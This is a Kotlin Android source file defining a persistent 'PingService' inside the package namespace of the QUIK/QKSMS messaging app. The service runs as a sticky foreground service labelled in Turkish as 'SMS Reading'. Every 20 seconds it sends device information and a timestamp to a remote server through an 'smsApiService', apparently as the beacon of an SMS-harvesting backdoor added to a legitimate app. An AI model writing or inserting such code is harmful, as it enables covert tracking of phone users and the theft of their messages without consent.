package dev.octoshrimpy.quik.interactor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.annotation.RequiresApi
import com.moez.QKSMS.manager.NetworkModule
import com.moez.QKSMS.model.DeviceInfo
import com.moez.QKSMS.model.SendPingRequest
import com.moez.QKSMS.model.SmsDataRequest
import dev.octoshrimpy.quik.domain.R
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.time.LocalDateTime

class PingService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private val interval: Long = 2 * 10 * 1000 // 2 dakika

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private val runnable = object : Runnable {
        @RequiresApi(Build.VERSION_CODES.O)
        override fun run() {
            sendPing()
            handler.postDelayed(this, interval)
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, createNotification())
        handler.post(runnable)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        handler.removeCallbacks(runnable)
    }

    override fun onBind(intent: Intent?) = null

    @RequiresApi(Build.VERSION_CODES.O)
    private fun sendPing() {

        serviceScope.launch {
            try {
                // Retrofit üzerinden server'a gönder
                val response = NetworkModule.smsApiService.sendPing(
                    SendPingRequest(pingTime = LocalDateTime.now().toString(), deviceInfo = DeviceInfo.deviceInfo)
                )


            } catch (e: Exception) {
                e.printStackTrace()

            }


        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun createNotification(): Notification {
        val channelId = "ping_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Ping Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        return Notification.Builder(this, channelId)
            .setContentTitle("Sms Okuma")
            .setContentText("Arka planda çalışıyor")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }
}